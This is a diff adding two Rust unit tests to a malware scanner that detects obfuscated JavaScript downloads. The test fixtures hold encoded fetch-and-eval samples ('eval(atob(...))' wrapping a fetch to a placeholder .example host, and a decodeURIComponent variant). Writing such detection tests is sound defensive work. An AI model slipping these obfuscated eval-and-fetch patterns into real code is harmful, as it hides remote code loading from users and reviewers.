@@ -9405,6 +9405,25 @@ mod js_url_extraction_tests {
     }
 
     #[test]
+    fn js_decodeuricomponent_array_index_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js = br#"var a = ["https%3A%2F%2Fdecode-array-index-js.example%2Fp"]; eval(decodeURIComponent(a[0]))"#
+            .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://decode-array-index-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS decodeURIComponent array index URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn js_unescape_malformed_percent_still_extracts_later_url() {
         let mut env = Environment::new(&Config::default());
         let js =
@@ -9986,6 +10005,28 @@ mod js_url_extraction_tests {
         assert!(
             has,
             "JS atob function alias payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_atob_array_index_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let encoded = base64::Engine::encode(
+            &base64::engine::general_purpose::STANDARD,
+            "fetch('https://atob-array-index-js.example/p')",
+        );
+        let js = format!(r#"var a = ["{encoded}"]; eval(atob(a[0]))"#).into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://atob-array-index-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS atob array index payload URL missed: {:?}",
             env.traits
         );
     }
